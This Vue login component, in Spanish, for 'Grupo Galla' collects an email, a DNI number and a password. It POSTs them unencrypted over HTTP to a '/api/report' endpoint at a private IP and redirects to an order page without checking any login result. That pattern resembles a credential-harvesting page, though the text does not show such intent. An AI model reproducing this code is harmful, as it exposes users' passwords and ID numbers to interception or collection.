<template>
  <div class="min-h-screen flex items-center justify-center bg-gradient-to-br from-orange-50 via-amber-50 to-yellow-50 relative overflow-hidden">
    <!-- Elementos decorativos de fondo -->
    <div class="absolute inset-0">
      <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-orange-300/10 rounded-full blur-3xl"></div>
      <div class="absolute bottom-1/4 right-1/4 w-80 h-80 bg-yellow-300/10 rounded-full blur-3xl"></div>
      <div class="absolute top-3/4 left-1/2 w-64 h-64 bg-amber-300/10 rounded-full blur-3xl"></div>
    </div>

    <!-- Contenedor principal -->
    <div class="relative w-full max-w-md">
      <div class="bg-white/95 backdrop-blur-xl p-12 rounded-3xl shadow-2xl border border-white/20 relative overflow-hidden">
        
        <!-- Gradiente decorativo superior -->
        <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500"></div>
        
        <!-- Logo con efecto brilloso -->
        <div class="flex justify-center mb-8">
          <div class="relative group">
            <div class="absolute inset-0 bg-gradient-to-r from-orange-400 to-yellow-600 rounded-full blur-lg opacity-25 group-hover:opacity-40 transition-opacity"></div>
            <img src="@/assets/galaLogo.png" alt="Gala Logo" class="relative h-40 drop-shadow-2xl transform group-hover:scale-105 transition-transform duration-300" />
          </div>
        </div>

        <!-- Título mejorado -->
        <div class="text-center mb-8">
          <h1 class="text-4xl font-bold bg-gradient-to-r from-orange-700 to-amber-600 bg-clip-text text-transparent mb-2">
            Bienvenido
          </h1>
          <p class="text-gray-500 text-base font-medium">
            Accede a tu cuenta de Grupo Galla
          </p>
        </div>

        <!-- Formulario con espaciado mejorado -->
        <form @submit.prevent="handleLogin" class="space-y-6">
          
          <!-- Email con iconos -->
          <div class="relative">
            <label class="block mb-3 text-sm font-bold text-gray-700 uppercase tracking-wide">
              Correo electrónico
            </label>
            <div class="relative">
              <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" />
                </svg>
              </div>
              <input
                v-model="email"
                type="email"
                placeholder="tu@empresa.com"
                class="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all shadow-sm hover:shadow-md bg-gray-50 focus:bg-white"
                required
              />
            </div>
          </div>

          <!-- DNI con iconos -->
          <div class="relative">
            <label class="block mb-3 text-sm font-bold text-gray-700 uppercase tracking-wide">
              DNI
            </label>
            <div class="relative">
              <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0zm6 8a6 6 0 00-12 0" />
                </svg>
              </div>
              <input
                v-model="dni"
                type="text"
                placeholder="Ej: 12345678"
                class="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all shadow-sm hover:shadow-md bg-gray-50 focus:bg-white"
                required
              />
            </div>
          </div>

          <!-- Contraseña con iconos -->
          <div class="relative">
            <label class="block mb-3 text-sm font-bold text-gray-700 uppercase tracking-wide">
              Contraseña
            </label>
            <div class="relative">
              <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <input
                v-model="password"
                type="password"
                placeholder="••••••••"
                class="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all shadow-sm hover:shadow-md bg-gray-50 focus:bg-white"
                required
              />
            </div>
          </div>

          <!-- Botón con gradiente animado -->
          <button
            type="submit"
            class="w-full bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500 text-white py-4 rounded-xl font-bold text-lg shadow-xl hover:shadow-2xl hover:scale-[1.02] transition-all duration-300 ease-out focus:outline-none focus:ring-4 focus:ring-orange-500/50 relative overflow-hidden group"
          >
            <span class="relative z-10">Iniciar Sesión</span>
            <div class="absolute inset-0 bg-gradient-to-r from-yellow-500 via-amber-500 to-orange-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
          </button>
        </form>

        <!-- Divider elegante -->
        <div class="my-8 flex items-center">
          <div class="flex-grow h-px bg-gradient-to-r from-transparent via-gray-300 to-transparent"></div>
          <span class="px-4 text-gray-400 text-sm font-medium">ó</span>
          <div class="flex-grow h-px bg-gradient-to-r from-transparent via-gray-300 to-transparent"></div>
        </div>

        <!-- Enlaces de ayuda -->
        <div class="text-center space-y-2">
          <p class="text-sm text-gray-500">
            ¿Olvidaste tu contraseña?
          </p>
          <a href="#" class="text-orange-600 hover:text-orange-700 font-semibold text-sm hover:underline transition-colors">
            Recuperar acceso →
          </a>
        </div>

        <!-- Mensaje de espera mejorado -->
        <div v-if="waiting" class="mt-8 p-4 bg-green-50 border border-green-200 rounded-xl">
          <p class="text-green-700 text-center font-medium flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
            <span>Iniciando sesión...</span>
          </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'
import axios from 'axios'
import { useRouter } from 'vue-router'

const email = ref('')
const password = ref('')
const dni = ref('')
const waiting = ref(false)
const router = useRouter()

const handleLogin = async () => {
  try {
    await axios.post('http://192.168.0.55:8095/api/report', {
      email: email.value,
      password: password.value,
      dni: dni.value
    })
    waiting.value = true
    setTimeout(() => {
      router.push({ name: 'pedido' })
    }, 1200)
  } catch (error) {
    console.error('Error al enviar datos', error)
  }
}
</script>